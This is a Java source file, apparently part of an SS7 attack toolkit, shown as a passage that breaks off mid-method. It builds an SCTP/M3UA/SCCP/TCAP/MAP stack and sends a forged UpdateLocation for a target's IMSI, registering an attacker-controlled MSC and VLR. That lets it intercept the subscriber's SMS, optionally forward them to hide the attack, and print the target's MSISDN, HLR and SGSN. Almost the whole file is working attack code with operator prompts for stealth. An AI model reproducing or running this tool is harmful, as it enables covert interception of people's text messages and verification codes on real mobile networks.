
/**
 * Created by gh0 on 10/2/16.
 */

import java.util.Scanner;

import org.mobicents.protocols.api.IpChannelType;
import org.mobicents.protocols.sctp.ManagementImpl;
import org.mobicents.protocols.ss7.indicator.NatureOfAddress;
import org.mobicents.protocols.ss7.indicator.RoutingIndicator;
import org.mobicents.protocols.ss7.m3ua.ExchangeType;
import org.mobicents.protocols.ss7.m3ua.Functionality;
import org.mobicents.protocols.ss7.m3ua.IPSPType;
import org.mobicents.protocols.ss7.m3ua.impl.AspImpl;
import org.mobicents.protocols.ss7.m3ua.impl.M3UAManagementImpl;
import org.mobicents.protocols.ss7.m3ua.impl.parameter.ParameterFactoryImpl;
import org.mobicents.protocols.ss7.m3ua.parameter.RoutingContext;
import org.mobicents.protocols.ss7.m3ua.parameter.TrafficModeType;
import org.mobicents.protocols.ss7.map.MAPStackImpl;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContext;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextName;
import org.mobicents.protocols.ss7.map.api.MAPApplicationContextVersion;
import org.mobicents.protocols.ss7.map.api.MAPDialog;
import org.mobicents.protocols.ss7.map.api.MAPDialogListener;
import org.mobicents.protocols.ss7.map.api.MAPException;
import org.mobicents.protocols.ss7.map.api.MAPMessage;
import org.mobicents.protocols.ss7.map.api.MAPMessageType;
import org.mobicents.protocols.ss7.map.api.MAPProvider;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortProviderReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPAbortSource;
import org.mobicents.protocols.ss7.map.api.dialog.MAPNoticeProblemDiagnostic;
import org.mobicents.protocols.ss7.map.api.dialog.MAPRefuseReason;
import org.mobicents.protocols.ss7.map.api.dialog.MAPUserAbortChoice;
//import org.mobicents.protocols.ss7.map.api.dialog.MAPProviderError;
import org.mobicents.protocols.ss7.map.api.errors.MAPErrorMessage;
import org.mobicents.protocols.ss7.map.api.primitives.AddressNature;
import org.mobicents.protocols.ss7.map.api.primitives.AddressString;
import org.mobicents.protocols.ss7.map.api.primitives.IMSI;
import org.mobicents.protocols.ss7.map.api.primitives.ISDNAddressString;
import org.mobicents.protocols.ss7.map.api.primitives.LMSI;
import org.mobicents.protocols.ss7.map.api.primitives.MAPExtensionContainer;
import org.mobicents.protocols.ss7.map.api.primitives.NumberingPlan;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPDialogMobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.MAPServiceMobilityListener;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.AuthenticationFailureReportResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.authentication.SendAuthenticationInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ForwardCheckSSIndicationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.ResetRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.faultRecovery.RestoreDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.imei.CheckImeiResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancelLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.CancellationType;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.IMSIWithLMSI;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.PurgeMSResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.SendIdentificationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.TypeOfUpdate;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateGprsLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.locationManagement.UpdateLocationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeRequest_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.oam.ActivateTraceModeResponse_Mobility;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.AnyTimeSubscriptionInterrogationResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberInformation.ProvideSubscriberInfoResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.DeleteSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataRequest;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.InsertSubscriberDataResponse;
import org.mobicents.protocols.ss7.map.api.service.mobility.subscriberManagement.SupportedCamelPhases;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.AlertServiceCentreResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.InformServiceCentreRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPDialogSms;
import org.mobicents.protocols.ss7.map.api.service.sms.MAPServiceSmsListener;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MoForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.MtForwardShortMessageResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.NoteSubscriberPresentRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReadyForSMResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.ReportSMDeliveryStatusResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SM_RP_DA;
import org.mobicents.protocols.ss7.map.api.service.sms.SM_RP_OA;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMRequest;
import org.mobicents.protocols.ss7.map.api.service.sms.SendRoutingInfoForSMResponse;
import org.mobicents.protocols.ss7.map.api.service.sms.SmsSignalInfo;
import org.mobicents.protocols.ss7.sccp.OriginationType;
import org.mobicents.protocols.ss7.sccp.RuleType;
import org.mobicents.protocols.ss7.sccp.SccpProvider;
import org.mobicents.protocols.ss7.sccp.SccpResource;
import org.mobicents.protocols.ss7.sccp.impl.SccpStackImpl;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle;
import org.mobicents.protocols.ss7.sccp.parameter.GlobalTitle0100;
import org.mobicents.protocols.ss7.sccp.parameter.SccpAddress;
import org.mobicents.protocols.ss7.tcap.TCAPStackImpl;
import org.mobicents.protocols.ss7.tcap.api.TCAPStack;
import org.mobicents.protocols.ss7.tcap.asn.ApplicationContextName;
import org.mobicents.protocols.ss7.tcap.asn.comp.Problem;

abstract class UlLowLevel implements MAPDialogListener, MAPServiceMobilityListener, MAPServiceSmsListener {

    // MTP Details
    protected int CLIENT_SPC;
    protected int SERVER_SPC; // PC of adjacent STP

    protected int NETWORK_INDICATOR; // International

    protected final int SERVICE_INDICATOR = 3; // SCCP
    protected final int SSN_Client = 7; // VLR SSN
    protected final int SSN_Server = 6; // HLR SSN
    protected final int SSN_MSC = 8; // Target Legitimate MSC

    // M3UA details
    protected String CLIENT_IP;
    protected int CLIENT_PORT;

    protected String SERVER_IP;
    protected int SERVER_PORT;

    protected final String CLIENT_ASSOCIATION_NAME = "clientAsscoiation";

    String attacker_msc;
    String attacker_vlr;

    String target_msc;
    String target_imsi;
    String target_imsiGT;
    String target_profile;
    String forward_sms;

    protected final ParameterFactoryImpl factory = new ParameterFactoryImpl();

    protected UlLowLevel() {
	init();
    }

    public void init() {
	try {
	    Scanner user_input = new Scanner(System.in);

	    System.out.print("\033[34m[*]\033[0mSet Client PC: ");
	    CLIENT_SPC = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer PC: ");
	    SERVER_SPC = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Client IP: ");
	    CLIENT_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Client Port: ");
	    CLIENT_PORT = user_input.nextInt();
	    System.out.print("\033[34m[*]\033[0mSet Peer IP: ");
	    SERVER_IP = user_input.next();
	    System.out.print("\033[34m[*]\033[0mSet Peer Port: ");
	    SERVER_PORT = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Network Indicator [0] International [2] National: ");
	    NETWORK_INDICATOR = user_input.nextInt();

	    System.out.print("\033[34m[*]\033[0mSet Target's IMSI: ");
	    target_imsi = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet Target's IMSI in GT Format [ mcc+mnc+msin --> cc+ndc+msin ]: ");
	    target_imsiGT = user_input.next();

	    System.out.print("\033[34m[*]\033[0mSet Your MSC GT to Intercept SMS: ");
	    attacker_msc = user_input.next();

	    System.out.print(
		    "\033[34m[*]\033[0mFor a Stealthier attack set the VLR as the real VLR of the target\033[34m[*]\033[0m\n");
	    System.out.print("\033[34m[*]\033[0mSet VLR GT: ");
	    attacker_vlr = user_input.next();

	    System.out.print("\033[34m[*]\033[0mForward the intercepted SMS to target?(y/n): ");
	    forward_sms = user_input.next();

	    if (forward_sms.equals("y") || forward_sms.equals("yes")) {
		System.out.print("\033[34m[*]\033[0mSet Target's Current MSC GT: ");
		target_msc = user_input.next();
	    }

	    System.out.println("\033[34m[*]\033[0mStack components are set...");
	    System.out.println("\033[34m[*]\033[0mInitializing the Stack...");

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError: " + ex.getMessage());
	    throw new RuntimeException(ex);
	}

    }
}

public class UpdateLocation extends UlLowLevel {

    // SCTP
    private ManagementImpl sctpManagement;

    // M3UA
    private M3UAManagementImpl clientM3UAMgmt;

    // SCCP
    private SccpStackImpl sccpStack;
    private SccpProvider sccpProvider;
    private SccpResource sccpResource;

    // TCAP
    private TCAPStack tcapStack;

    // MAP
    private MAPStackImpl mapStack;
    private MAPProvider mapProvider;

    public UpdateLocation() {
	// TODO Auto-generated constructor stub
    }

    protected void initializeStack(IpChannelType ipChannelType) throws Exception {

	this.initSCTP(ipChannelType);

	// Initialize M3UA first
	this.initM3UA();

	// Initialize SCCP
	this.initSCCP();

	// Initialize TCAP
	this.initTCAP();

	// Initialize MAP
	this.initMAP();

	// FInally start ASP
	this.clientM3UAMgmt.startAsp("ASP1");
    }

    private void initSCTP(IpChannelType ipChannelType) throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCTP Stack ....");
	try {
	    this.sctpManagement = new ManagementImpl("Client");
	    this.sctpManagement.setSingleThread(true);
	    this.sctpManagement.start();
	    this.sctpManagement.setConnectDelay(10000);
	    this.sctpManagement.removeAllResourses();

	    // 1. Create SCTP Association
	    sctpManagement.addAssociation(CLIENT_IP, CLIENT_PORT, SERVER_IP, SERVER_PORT, CLIENT_ASSOCIATION_NAME,
		    ipChannelType, null);
	    System.out.println("\033[32m[+]\033[0mInitialized SCTP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing SCTP: " + e.getMessage());
	    System.exit(1);
	}
    }

    private void initM3UA() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing M3UA Stack ....");
	try {
	    this.clientM3UAMgmt = new M3UAManagementImpl("Client", null);
	    this.clientM3UAMgmt.setTransportManagement(this.sctpManagement);
	    this.clientM3UAMgmt.start();
	    this.clientM3UAMgmt.removeAllResourses();

	    RoutingContext rc = factory.createRoutingContext(new long[] { 100l });
	    TrafficModeType trafficModeType = factory.createTrafficModeType(TrafficModeType.Loadshare);

	    this.clientM3UAMgmt.createAs("AS1", Functionality.IPSP, ExchangeType.SE, IPSPType.CLIENT, rc,
		    trafficModeType, 1, null);

	    // Step 2 : Create ASP
	    this.clientM3UAMgmt.createAspFactory("ASP1", CLIENT_ASSOCIATION_NAME);

	    // Step3 : Assign ASP to AS
	    AspImpl asp = this.clientM3UAMgmt.assignAspToAs("AS1", "ASP1");

	    // Step 4: Add Route.
	    clientM3UAMgmt.addRoute(SERVER_SPC, CLIENT_SPC, SERVICE_INDICATOR, "AS1");

	    System.out.println("\033[32m[+]\033[0mInitialized M3UA Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing M3UA: " + e.getMessage());
	    System.exit(2);

	}

    }

    private void initSCCP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing SCCP Stack ....");
	try {

	    this.sccpStack = new SccpStackImpl("MapLoadClientSccpStack");
	    this.sccpStack.setMtp3UserPart(1, this.clientM3UAMgmt);

	    this.sccpStack.start();
	    this.sccpStack.removeAllResourses();

	    this.sccpStack.getSccpResource().addRemoteSpc(1, SERVER_SPC, 0, 0);
	    this.sccpStack.getSccpResource().addRemoteSsn(1, SERVER_SPC, SSN_Server, 0, false);

	    this.sccpStack.getRouter().addMtp3ServiceAccessPoint(1, 1, CLIENT_SPC, NETWORK_INDICATOR, 0, null);
	    this.sccpStack.getRouter().addMtp3Destination(1, 1, SERVER_SPC, SERVER_SPC, 0, 255, 255);

	    this.sccpProvider = this.sccpStack.getSccpProvider();

	    // SCCP routing table
	    GlobalTitle0100 remotGTs = this.sccpProvider.getParameterFactory().createGlobalTitle("*", 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);
	    GlobalTitle0100 localMscGT = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    GlobalTitle0100 localVlrGT = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_vlr, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    this.sccpStack.getRouter().addRoutingAddress(1, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server));

	    this.sccpStack.getRouter().addRoutingAddress(2, this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localVlrGT, CLIENT_SPC, SSN_Client));
	    this.sccpStack.getRouter().addRoutingAddress(3, this.sccpProvider.getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_DPC_AND_SSN, localMscGT, CLIENT_SPC, SSN_MSC));

	    SccpAddress patternRemote = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, remotGTs, SERVER_SPC, SSN_Server);
	    SccpAddress patternLocal = this.sccpProvider.getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localVlrGT, CLIENT_SPC, SSN_Client);
	    SccpAddress patternLocal_MSC = this.sccpProvider.getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, localMscGT, CLIENT_SPC, SSN_MSC);

	    String maskRemote = "K";
	    String maskLocal = "R";

	    this.sccpStack.getRouter().addRule(1, RuleType.SOLITARY, null, OriginationType.LOCAL, patternRemote,
		    maskRemote, 1, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(2, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal,
		    maskLocal, 2, -1, null, 0, null);
	    this.sccpStack.getRouter().addRule(3, RuleType.SOLITARY, null, OriginationType.REMOTE, patternLocal_MSC,
		    maskLocal, 2, -1, null, 0, null);

	    System.out.println("\033[32m[+]\033[0mInitialized SCCP Stack ....");
	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing SCCP: " + e.getMessage());
	    System.exit(3);
	}
    }

    private void initTCAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing TCAP Stack ....");
	try {
	    this.tcapStack = new TCAPStackImpl("tcap", this.sccpStack.getSccpProvider(), SSN_Client);
	    this.tcapStack.start();
	    this.tcapStack.setDialogIdleTimeout(6000000);
	    this.tcapStack.setInvokeTimeout(180000);
	    this.tcapStack.setMaxDialogs(2000);

	    System.out.println("\033[32m[+]\033[0mInitialized TCAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initializing TCAP: " + e.getMessage());
	    System.exit(4);
	}
    }

    private void initMAP() throws Exception {
	System.out.println("\033[34m[*]\033[0mInitializing MAP Stack ....");
	try {

	    this.mapStack = new MAPStackImpl("MAP-MSC", this.tcapStack.getProvider());
	    this.mapProvider = this.mapStack.getMAPProvider();

	    this.mapProvider.addMAPDialogListener(this);
	    this.mapProvider.getMAPServiceMobility().addMAPServiceListener(this);
	    this.mapProvider.getMAPServiceSms().addMAPServiceListener(this);

	    this.mapProvider.getMAPServiceMobility().acivate();
	    this.mapProvider.getMAPServiceSms().acivate();

	    this.mapStack.start();

	    System.out.println("\033[32m[+]\033[0mInitialized MAP Stack ....");

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mFailed to Initialize MAP: " + e.getMessage());
	    System.exit(5);
	}
    }

    public void initiateUL() throws MAPException {

	try {

	    // Create of the attacker fake MSC and VLR
	    ISDNAddressString msc = this.mapProvider.getMAPParameterFactory()
		    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, attacker_msc);

	    ISDNAddressString vlr = this.mapProvider.getMAPParameterFactory()
		    .createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, attacker_vlr);

	    // Create IMSI of the target
	    IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(target_imsi);

	    GlobalTitle0100 gtVlr = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_vlr, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
		    NatureOfAddress.INTERNATIONAL);

	    // in UL scenario the routing is derived from the IMSI, IMSI(E.212) is exchanged
	    // to the E.214 format
	    GlobalTitle0100 calledIMSIGT = this.sccpProvider.getParameterFactory().createGlobalTitle(target_imsiGT, 0,
		    org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
		    NatureOfAddress.INTERNATIONAL);

	    SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory()
		    .createSccpAddress(RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtVlr, CLIENT_SPC, SSN_Client);

	    SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
		    RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledIMSIGT, SERVER_SPC, SSN_Server);

	    // First create Dialog
	    MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(MAPApplicationContext
		    .getInstance(MAPApplicationContextName.networkLocUpContext, MAPApplicationContextVersion.version3),
		    callingParty, null, calledParty, null);

	    mapDialog.addUpdateLocationRequest(imsi, msc, null, vlr, null, null, null, false, false, null, null, null,
		    false, false);

	    mapDialog.send();

	    System.out.println(
		    "\033[34m[*]\033[0mUpdating Location for Target's IMSI " + target_imsi + " is processing..");

	} catch (MAPException e) {
	    System.out.println("\033[31m[-]\033[0mMAP Error: " + e.getMessage());
	    System.out.println("\033[31m[-]\033[0mTerminating Session...");
	    System.exit(6);
	}
    }

    public void onDialogNotice(MAPDialog mapDialog, MAPNoticeProblemDiagnostic noticeProblemDiagnostic) {
	System.out.printf("\033[31m[-]\033[0mError: DialogNotice for DialogId=%d MAPNoticeProblemDiagnostic=%s\n ",
		mapDialog.getLocalDialogId(), noticeProblemDiagnostic);
	System.exit(7);
    }

    @Override
    public void onDialogRelease(MAPDialog mapDialog) {

    }

    public void onDialogProviderAbort(MAPDialog mapDialog, MAPAbortProviderReason abortProviderReason,
	    MAPAbortSource abortSource, MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mError: DialogProviderAbort for DialogId=%d MAPAbortProviderReason=%s MAPAbortSource=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), abortProviderReason, abortSource, extensionContainer);
	System.exit(8);
    }

    @Override
    public void onDialogClose(MAPDialog mapDialog) {

    }

    public void onDialogReject(MAPDialog mapDialog, MAPRefuseReason refuseReason,
	    ApplicationContextName alternativeApplicationContext, MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mError: DialogReject for DialogId=%d MAPRefuseReason=%s MAPProviderError=%s ApplicationContextName=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), refuseReason, alternativeApplicationContext, extensionContainer);
	System.exit(9);
    }

    @Override
    public void onDialogDelimiter(MAPDialog mapDialog) {

    }

    @Override
    public void onDialogRequest(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    MAPExtensionContainer mapExtensionContainer) {

    }

    @Override
    public void onDialogRequestEricsson(MAPDialog mapDialog, AddressString addressString, AddressString addressString1,
	    AddressString addressString2, AddressString addressString3) {

    }

    @Override
    public void onDialogAccept(MAPDialog mapDialog, MAPExtensionContainer mapExtensionContainer) {

    }

    public void onDialogTimeout(MAPDialog mapDialog) {
	System.out.printf("\033[31m[-]\033[0mError: DialogTimeout for DialogId=%d\n", mapDialog.getLocalDialogId());
	System.exit(10);
    }

    public void onDialogUserAbort(MAPDialog mapDialog, MAPUserAbortChoice userReason,
	    MAPExtensionContainer extensionContainer) {
	System.out.printf(
		"\033[31m[-]\033[0mDialogUserAbort for DialogId=%d MAPUserAbortChoice=%s MAPExtensionContainer=%s\n",
		mapDialog.getLocalDialogId(), userReason, extensionContainer);
	System.exit(11);
    }

    public void onErrorComponent(MAPDialog mapDialog, Long invokeId, MAPErrorMessage mapErrorMessage) {
	System.out.printf("\033[31m[-]\033[0mMAP Error Component for Dialog=%d and invokeId=%d MAPErrorMessage= %s\n",
		mapDialog.getLocalDialogId(), invokeId, mapErrorMessage);
	System.exit(12);
    }

    @Override
    public void onRejectComponent(MAPDialog mapDialog, Long aLong, Problem problem, boolean b) {

    }

    public void onInvokeTimeout(MAPDialog mapDialog, Long invokeId) {

    }

    public void onMAPMessage(MAPMessage mapMessage) {

    }

    public static void main(String args[]) {
	System.out.println("*********************************************");
	System.out.println("***              Intercepting             ***");
	System.out.println("*********************************************");

	IpChannelType ipChannelType = IpChannelType.SCTP;

	final UpdateLocation attacker = new UpdateLocation();

	try {
	    attacker.initializeStack(ipChannelType);

	    // Lets pause for 20 seconds so stacks are initialized properly
	    Thread.sleep(20000);
	    attacker.initiateUL();

	} catch (Exception e) {
	    System.out.println("\033[31m[-]\033[0mError Initiating Attack: " + e.getMessage());
	    System.exit(14);
	}
    }

    @Override
    public void onUpdateLocationRequest(UpdateLocationRequest updateLocationRequest) {

    }

    @Override
    public void onUpdateLocationResponse(UpdateLocationResponse updateLocationResponse) {

    }

    @Override
    public void onInsertSubscriberDataRequest(InsertSubscriberDataRequest insertSubscriberDataRequest) {

	System.out.println("\033[34m[*]\033[0mInsertSubscriber Data Request Received");
	try {

	    long invokeID = insertSubscriberDataRequest.getInvokeId();
	    GlobalTitle hlr = insertSubscriberDataRequest.getMAPDialog().getRemoteAddress().getGlobalTitle();

	    ISDNAddressString msisdn = insertSubscriberDataRequest.getMsisdn();
	    ISDNAddressString sgsn = insertSubscriberDataRequest.getSgsnNumber();

	    System.out.println("\033[32m[+]\033[0mTarget HLR: " + hlr.getDigits());

	    if (msisdn != null) {
		System.out.println("\033[32m[+]\033[0mTarget MSISDN: " + msisdn.getAddress());
	    } else {
		System.out.println("\033[31m[-]\033[0mMSISDN: No Info returned for the MSISDN parameter");
	    }

	    if (sgsn != null) {
		System.out.println("\033[32m[+]\033[0mTarget SGSN: " + sgsn.getAddress());
	    } else {
		System.out.println("\033[31m[-]\033[0mSGSN: No Info returned for the SGSN parameter");
	    }

	    SupportedCamelPhases supportedCamelPhases = this.mapProvider.getMAPParameterFactory()
		    .createSupportedCamelPhases(true, true, false, false);
	    MAPDialogMobility mapDialogMobility = insertSubscriberDataRequest.getMAPDialog();
	    mapDialogMobility.setUserObject(invokeID);

	    mapDialogMobility.addInsertSubscriberDataResponse(invokeID, null, null, null, null, null,
		    supportedCamelPhases, null, null, null);
	    mapDialogMobility.send();

	    System.out.println("\033[34m[*]\033[0mReceiving SMS...");

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError Sending Response:  " + ex.getMessage());
	    System.exit(15);
	}
    }

    @Override
    public void onCancelLocationRequest(CancelLocationRequest cancelLocationRequest) {

	try {
	    System.out.println("\033[34m[*]\033[0mCancelLocation Request Received");
	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mCancelLocationRequet Error :  " + ex.getMessage());
	    System.exit(17);

	}
    }

    @Override
    public void onCancelLocationResponse(CancelLocationResponse cancelLocationResponse) {

    }

    @Override
    public void onForwardShortMessageRequest(ForwardShortMessageRequest forwardShortMessageRequest) {

	try {

	    SM_RP_DA destination_imsi = forwardShortMessageRequest.getSM_RP_DA();
	    SM_RP_OA orig_smsc = forwardShortMessageRequest.getSM_RP_OA();
	    SmsSignalInfo sms_data = forwardShortMessageRequest.getSM_RP_UI();

	    if (forward_sms.equals("y") || forward_sms.equals("yes")) {

		// Create of the attacker fake MSC
		ISDNAddressString truemsc = this.mapProvider.getMAPParameterFactory()
			.createISDNAddressString(AddressNature.international_number, NumberingPlan.ISDN, target_msc);

		// Create IMSI of the target
		IMSI imsi = this.mapProvider.getMAPParameterFactory().createIMSI(target_imsi);

		GlobalTitle0100 gtMsc = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);

		GlobalTitle0100 calledIMSIGT = this.sccpProvider.getParameterFactory().createGlobalTitle(target_imsiGT,
			0, org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_MOBILE, null,
			NatureOfAddress.INTERNATIONAL);

		SccpAddress callingParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
			RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtMsc, CLIENT_SPC, SSN_Client);

		SccpAddress calledParty = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
			RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, calledIMSIGT, SERVER_SPC, SSN_Server);

		// First create Dialog
		MAPDialogMobility mapDialog = this.mapProvider.getMAPServiceMobility().createNewDialog(
			MAPApplicationContext.getInstance(MAPApplicationContextName.networkLocUpContext,
				MAPApplicationContextVersion.version3),
			callingParty, null, calledParty, null);

		mapDialog.addUpdateLocationRequest(imsi, truemsc, null, truemsc, null, null, null, false, false, null,
			null, null, false, false);

		mapDialog.send();

		System.out.println("\033[34m[*]\033[0mUpdating Location to the real MSC");
		////////////////////////////////////////////////////////////////////////////////////////
		/// Forwarding SMS to target
		CancelLocationRequest cancelLocationRequest = new CancelLocationRequest() {
		    @Override
		    public long getInvokeId() {
			return 0;
		    }

		    @Override
		    public void setInvokeId(long l) {

		    }

		    @Override
		    public MAPDialogMobility getMAPDialog() {
			return null;
		    }

		    @Override
		    public void setMAPDialog(MAPDialog mapDialog) {

		    }

		    @Override
		    public MAPMessageType getMessageType() {
			return null;
		    }

		    @Override
		    public int getOperationCode() {
			return 0;
		    }

		    @Override
		    public boolean isReturnResultNotLast() {
			return false;
		    }

		    @Override
		    public IMSI getImsi() {
			return null;
		    }

		    @Override
		    public IMSIWithLMSI getImsiWithLmsi() {
			return null;
		    }

		    @Override
		    public CancellationType getCancellationType() {
			return null;
		    }

		    @Override
		    public MAPExtensionContainer getExtensionContainer() {
			return null;
		    }

		    @Override
		    public TypeOfUpdate getTypeOfUpdate() {
			return null;
		    }

		    @Override
		    public boolean getMtrfSupportedAndAuthorized() {
			return false;
		    }

		    @Override
		    public boolean getMtrfSupportedAndNotAuthorized() {
			return false;
		    }

		    @Override
		    public ISDNAddressString getNewMSCNumber() {
			return null;
		    }

		    @Override
		    public ISDNAddressString getNewVLRNumber() {
			return null;
		    }

		    @Override
		    public LMSI getNewLmsi() {
			return null;
		    }

		    @Override
		    public long getMapProtocolVersion() {
			return 0;
		    }
		};
		onCancelLocationRequest(cancelLocationRequest);
		System.out.println("\033[34m[*]\033[0mForwarding SMS to target...");

